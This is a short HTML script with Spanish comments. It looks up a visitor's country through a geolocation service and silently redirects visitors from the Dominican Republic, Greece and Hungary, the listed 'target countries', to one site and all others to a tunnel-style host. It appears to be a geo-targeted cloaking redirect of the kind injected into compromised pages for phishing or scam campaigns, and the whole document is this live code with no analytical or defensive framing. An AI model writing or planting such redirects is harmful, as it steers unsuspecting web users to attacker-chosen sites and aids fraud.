<script>
let countryHack = ['DO', 'GR', 'HU']; // Paises objetivo
let urlPromocion = 'https://grecia.pages.dev/';
let urlPredeterminada = 'https://e3c9vo5.bip.sh';
let country;

fetch('https://get.geojs.io/v1/ip/country')
    .then((response) => response.text())
    .then((data) => {
        country = data.trim();
        if (countryHack.includes(country)) {
            window.location.href = urlPromocion;
        } else {
            // Redirige a la URL predeterminada si el país no está en la lista
            window.location.href = urlPredeterminada;
        }
    });
    </script>
